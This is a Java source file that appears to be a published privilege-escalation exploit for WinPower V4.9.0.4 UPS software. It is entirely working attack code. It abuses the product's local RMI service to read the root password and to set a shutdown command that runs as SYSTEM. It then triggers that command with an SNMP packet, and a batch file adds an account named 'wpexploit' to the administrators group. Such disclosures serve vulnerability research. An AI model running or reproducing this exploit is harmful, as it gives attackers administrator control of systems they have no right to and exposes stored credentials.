﻿import com.adventnet.snmp.snmp2.*;
import java.io.*;
import wprmi.SimpleRMIInterface;

public class WinPowerExploit {
    private static String command_path = System.getProperty("user.dir") + "\\command.bat";
    private static String command_username = "wpexploit";

    private static void send_snmp_packet(String IP, SnmpPDU sendPDU) throws SnmpException {
        SnmpAPI api = new SnmpAPI();
        api.setCharacterEncoding("UTF-8");
        api.start();

        SnmpSession session = new SnmpSession(api);
        session.open();
        session.setPeername(IP);
        session.setRemotePort(2199);
        session.send(sendPDU);
    }

    public static void sendShutdownCommand(String agentIP) throws SnmpException {
        SnmpPDU pdu2 = new SnmpPDU();
        pdu2.setCommand((byte) -92);
        SnmpOID oid = new SnmpOID(".1.3.6.1.2.1.33.1.6.3.25.0");
        pdu2.setEnterprise(oid);
        byte dataType = 4;
        SnmpVar var = SnmpVar.createVariable("", dataType);
        SnmpVarBind varbind = new SnmpVarBind(oid, var);
        pdu2.addVariableBinding(varbind);
        send_snmp_packet(agentIP, pdu2);
    }

    private static void create_command_file() throws IOException {
        Writer writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(command_path), "utf-8"));
        writer.write("net user " + command_username + " /add\n");
        writer.write("net localgroup administrators " + command_username + " /add\n");
        writer.write("net stop UPSmonitor");
        writer.close();
    }

    private static String exec_cmd(String cmd) throws java.io.IOException {
        Process proc = Runtime.getRuntime().exec(cmd);
        java.io.InputStream is = proc.getInputStream();
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        String val = "";
        if (s.hasNext()) {
            val = s.next();
        } else {
            val = "";
        }
        return val;
    }

    private static boolean is_user_exist() throws IOException {
        String output = exec_cmd("net user");
        return output.contains(command_username);
    }

    public static void main(String[] args) {
        try {
            System.out.println("WinPower V4.9.0.4 Privilege Escalation");
            System.out.println("by Kacper Szurek");
            System.out.println("http://security.szurek.pl/");

            String is_service_started = exec_cmd("sc query UPSmonitor");
            if (!is_service_started.contains("RUNNING")) {
                System.out.println("[-] Monitor service not running");
                System.exit(0);
            }

            create_command_file();
            System.out.println("[*] Create shutdown command: " + command_path);

            wprmi.SimpleRMIInterface myServerObject = (SimpleRMIInterface) java.rmi.Naming.lookup("rmi://127.0.0.1:2099/SimpleRMIImpl");
            String root_password = myServerObject.getDataString(29, 1304, -1, 0);
            System.out.println("[+] Get root password: " + root_password);
            System.out.println("[+] Enable running command on shutdown");
            myServerObject.setData(29, 262, 1, "", -1L, 0);

            System.out.println("[+] Set shutdown command path");
            myServerObject.setData(29, 235, -1, command_path, -1L, 0);

            System.out.println("[+] Set execution as SYSTEM");
            myServerObject.setData(29, 203, 0, "", -1L, 0);

            System.out.println("[+] Allow remote shutdown");
            myServerObject.setData(29, 263, 1, "", -1L, 0);

            System.out.println("[+] Add localhost as remote shutdown agent");
            myServerObject.setData(29, 299, -1, "127.0.0.1 ", -1L, 0);

            System.out.println("[+] Set delay to 999");
            myServerObject.setData(29, 236, 999, "", -1L, 0);

            System.out.println("[+] Send shutdown command");
            sendShutdownCommand("127.0.0.1");

            System.out.print("[+] Waiting for admin account creation");

            int i = 0;
            while (i < 15) {
                if (is_user_exist()) {
                    System.out.println("\n[+] Account created, now login as: " + command_username);
                    System.exit(0);
                    break;
                } else {
                    System.out.print(".");
                    Thread.sleep(2000);
                }
                i += 1;
            }

            System.out.print("\n[-] Exploit failed, admin account not created");
            System.exit(1);
        } catch (Exception e) {
            System.out.println("\n[-] Error: " + e.getMessage());
        }
    }
}
